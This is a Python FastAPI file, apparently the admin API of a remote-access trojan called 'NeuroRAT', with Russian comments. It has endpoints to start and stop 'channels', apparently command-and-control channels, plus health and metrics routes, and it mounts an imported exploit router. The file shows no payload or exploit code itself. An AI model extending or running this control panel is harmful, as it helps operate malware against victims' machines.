from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from common.utils import get_logger
from channel_manager import ChannelManager
from api.exploit import router as exploit_router
import uvicorn
from prometheus_client import generate_latest, CONTENT_TYPE_LATEST, CollectorRegistry, Counter
from fastapi.responses import Response

app = FastAPI(
    title="NeuroRAT Admin API",
    version="0.1.0",
    description="REST API для управления NeuroRAT каналами и получения статистики"
)
app.include_router(exploit_router)
logger = get_logger("api")

# Инициализация менеджера каналов
manager = ChannelManager()

# Создаем счетчик запросов API
REQUEST_COUNTER = Counter('http_requests_total', 'Total HTTP Requests', ['method', 'endpoint', 'http_status'])

# Middleware для подсчета запросов
@app.middleware('http')
async def count_requests(request, call_next):
    response = await call_next(request)
    REQUEST_COUNTER.labels(method=request.method, endpoint=request.url.path, http_status=response.status_code).inc()
    return response

# Запускаем менеджер каналов при старте API
@app.on_event("startup")
def startup_event():
    success = manager.start()
    if not success:
        logger.error("Не удалось запустить ChannelManager при старте API")
    else:
        logger.info("ChannelManager запущен через API")

# Модель запроса для управления каналами
class ChannelAction(BaseModel):
    channel: str

# Получить список каналов и их статусы
@app.get("/channels")
def get_channels():
    stats = manager.get_statistics()
    return {"channels": list(stats.get('channels', {}).keys()), "stats": stats}

# Запустить указанный канал
@app.post("/channels/start")
def start_channel(action: ChannelAction):
    if action.channel not in manager.channels:
        raise HTTPException(status_code=404, detail="Канал не найден")
    result = manager.channels[action.channel].start()
    return {"channel": action.channel, "started": result}

# Остановить указанный канал
@app.post("/channels/stop")
def stop_channel(action: ChannelAction):
    if action.channel not in manager.channels:
        raise HTTPException(status_code=404, detail="Канал не найден")
    manager.channels[action.channel].stop()
    return {"channel": action.channel, "stopped": True}

# Общая остановка и запуск менеджера
@app.post("/manager/start")
def start_manager():
    result = manager.start()
    return {"manager_started": result}

@app.post("/manager/stop")
def stop_manager():
    manager.stop()
    return {"manager_stopped": True}

# Эндпоинт проверки здоровья
@app.get("/health")
def health_check():
    return {"status": "ok"}

# Endpoint метрик
@app.get('/metrics')
def metrics():
    registry = CollectorRegistry()
    registry.register(REQUEST_COUNTER)
    data = generate_latest(registry)
    return Response(data, media_type=CONTENT_TYPE_LATEST)

if __name__ == "__main__":
    uvicorn.run("src.api.app:app", host="0.0.0.0", port=8000, reload=True) 